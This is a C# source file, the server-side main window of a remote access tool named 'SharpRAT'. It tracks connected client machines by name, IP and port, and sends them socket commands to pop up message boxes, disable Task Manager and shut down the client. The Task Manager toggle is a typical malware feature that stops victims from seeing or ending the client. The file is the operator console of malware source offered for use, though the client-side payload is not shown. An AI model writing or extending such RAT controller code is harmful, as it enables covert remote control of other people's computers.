using Server.Server;

namespace Server
{
    public partial class Main : Form
    {
        private readonly ImageList imageList;
        public readonly SocketServer socketServer;
        #pragma warning disable CS8618
            public static RequestUI uiRequests;
#pragma warning restore CS8618

        public Main()
        {
            socketServer = new SocketServer();
            uiRequests = new RequestUI();
            imageList = new ImageList();
            InitializeComponent();

        }
        private void AddUserToViewlist(string text)
        {
            // Parse text
            string
                szName = text.Split("<SPLIT>")[0],
                szIPAddress = text.Split("<SPLIT>")[1],
                szPort = text.Split("<SPLIT>")[2];

            // Add data to viewList.
            Bitmap image;
            image = WinIcons.GetImageFromIcon("dsuiext.dll", (int)WinIcons.Dsuiext.User_ICO);
            imageList.Images.Add(image);
            imageList.ColorDepth = ColorDepth.Depth32Bit; // Improves quality of the image.
            userView.SmallImageList = imageList;
            userView.View = View.Details;
            ListViewItem userViewItem = new ListViewItem { ImageIndex = imageList.Images.Count - 1, Text = szName };
            userViewItem.SubItems.Add(szIPAddress);
            userViewItem.SubItems.Add(szPort);
            userView.Items.Add(userViewItem);

            // Log the new connection.
            Log.Info($"Client {szName} - [{szIPAddress}:{szPort}] connected.");
        }

        private void RemoveUserFromViewlist(string text)
        {
            int index = int.Parse(text);
            try
            {
                Log.Info($"Client {userView.Items[index].Text} - [{userView.Items[index].SubItems[1].Text}:" +
                    $"{userView.Items[index].SubItems[2].Text}] disconnected.");
                userView.Items[index].Remove();
                userView.Update();
            }
            catch (Exception ex)
            {
                Log.Error(ex.Message);
            }
        }

        private void UpdateStatus(string statusText)
        {
            statusLbl.Text = "Status: " + statusText;
        }

        private void LoadImagesForUI()
        {
            /* 
             Load icons from Windows internal dlls with quite bad quality,
             it would be smarter to extract the icon files to TEMP and load them from there for better quality.
            */
            settingsToolStripMenuItem.Image = WinIcons.GetImageFromIcon("wmploc.dll", (int)WinIcons.Wmploc.Settings_ICO);
            sendMessageBoxToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.PcKeyboard_ICO);
            userControlToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.Keychain_ICO);
            disableTaskmanagerToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.NotAllowed_ICO);
            shutdownClientToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.Shutdown_ICO);
        }

        private void Main_Load(object sender, EventArgs e)
        {
            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SharpRAT"))
            {
                Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SharpRAT\\");
            }
            LoadImagesForUI();

            // Start the server on it's own thread, so it does not hog all the UI resources.
            Thread serverThread = new Thread(socketServer.ExecuteServer);
            serverThread.IsBackground = true;
            serverThread.Start();
            UpdateStatus("Server started");
        }

        private void uiUpdateTimer_Tick(object sender, EventArgs e)
        {
            int requestID = uiRequests.RequestReceived();
            if (requestID != 0) // Another thread requested UI to update requsted item.
            {
                switch(uiRequests.GetRequestType(requestID)) // Check request type and call the correct function.
                {
                    case RequestUI.RequestType.UI_ADD_USER:
                        AddUserToViewlist(uiRequests.GetRequestText(requestID));
                        break;
                    case RequestUI.RequestType.UI_REMOVE_USER:
                        RemoveUserFromViewlist(uiRequests.GetRequestText(requestID));
                        break;
                    case RequestUI.RequestType.UI_UPDATE_STATUS:
                        UpdateStatus(uiRequests.GetRequestText(requestID));
                        break;
                }
            }
        }

        private void sendMessageBoxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MessageboxCreator messageboxCreator = new MessageboxCreator(socketServer, userView.SelectedItems[0].Index);
            messageboxCreator.ShowDialog();
        }

        private void userMenuStrip_Opening(object sender, System.ComponentModel.CancelEventArgs e)
        {
            if (userView.SelectedItems.Count == 0) // No items selected, no need to open.
            {
                e.Cancel = true;
                return;
            }
        }

        private void disableTaskmanagerToolStripMenuItem_CheckedChanged(object sender, EventArgs e)
        {
            string messageBoxStr
                = "<SET-TASKMGR>" + Convert.ToInt32(disableTaskmanagerToolStripMenuItem.Checked).ToString() + "<EOF>";
            socketServer.Send(SocketServer.GetClient(userView.SelectedItems[0].Index).socket, messageBoxStr);
        }

        private void shutdownClientToolStripMenuItem_Click(object sender, EventArgs e)
        {
            socketServer.Send(SocketServer.GetClient(userView.SelectedItems[0].Index).socket, "<SHUTDOWN-CLIENT>" + "<EOF>");
        }

        private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            UI.Settings settings = new UI.Settings();
            settings.ShowDialog();
        }
    }
}